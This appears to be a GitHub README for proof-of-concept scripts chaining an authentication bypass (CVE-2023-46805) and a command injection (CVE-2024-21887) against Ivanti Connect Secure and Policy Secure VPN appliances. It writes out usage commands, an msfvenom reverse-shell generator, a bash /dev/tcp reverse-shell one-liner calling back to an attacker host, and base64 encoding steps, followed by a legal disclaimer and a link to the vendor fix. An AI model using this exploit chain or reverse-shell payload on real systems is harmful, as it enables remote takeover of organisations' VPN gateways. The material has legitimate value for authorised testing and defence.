#! WORK IN PROGRESS !#

# CVE-2023-46805
An authentication bypass vulnerability in the web component of Ivanti ICS 9.x, 22.x and Ivanti Policy Secure allows a remote attacker to access restricted resources by bypassing control checks.

usage: ./CVE-2023-46805.sh http(s)://fqdn:port
<br>./CVE-2023-46805.sh https://my.vpn.ip:443

![image](https://github.com/duy-31/CVE-2023-46805_CVE-2024-21887/assets/20819326/1a5a7b6d-fa45-47ce-bff6-98ecabfee3d6)

notes:
chmod +x CVE-2023-46805.sh
<br> require app curl + json_pp

result if vulnerable, you should see somes stuffs:

![image](https://github.com/duy-31/CVE-2023-46805_CVE-2024-21887/assets/20819326/89b01426-5fb4-4ef1-8fdd-265c948fa8f2)


# CVE-2024-21887
A command injection vulnerability in web components of Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure allows an authenticated administrator to send specially crafted requests and execute arbitrary commands on the appliance.

=> With the CVE-2023-46805 you ARE authentificated

- generate the payload (reverse shell in my case) with msfvenom

msfvenom -p cmd/unix/reverse_bash LHOST=your.ip LPORT=8080 -f raw

bash -c '0<&99-;exec 99<>/dev/tcp/your.ip/8080;sh <&99 >&99 2>&99'

- encode the payload in base64

echo "bash -c '0<&99-;exec 99<>/dev/tcp/your.ip/8080;sh <&99 >&99 2>&99'" | base64 -w0

- run the poc

usage: ./CVE-2024-21887.sh http(s)://fqdn:port payload_base64_encoded
<br>./CVE-2024-21887.sh https://my.vpn.ip:443 dGhpcyBpcyBhIG5pY2UgdHJ5IDop

notes:
chmod +x CVE-2024-21887.sh
<br> require app curl







------
<br>Workaround/Fix: https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US

Kudos: https://attackerkb.com/topics/AdUh6by52K/cve-2023-46805/rapid7-analysis

------

more about me ;) https://www.linkedin.com/in/duy-huan-bui/

⚠️ Disclaimer:
IMPORTANT: This script is provided for educational, ethical testing, and lawful use ONLY. Do not use it on any system or network without explicit permission. Unauthorized access to computer systems and networks is illegal, and users caught performing unauthorized activities are subject to legal actions. The author is NOT responsible for any damage caused by the misuse of this script.

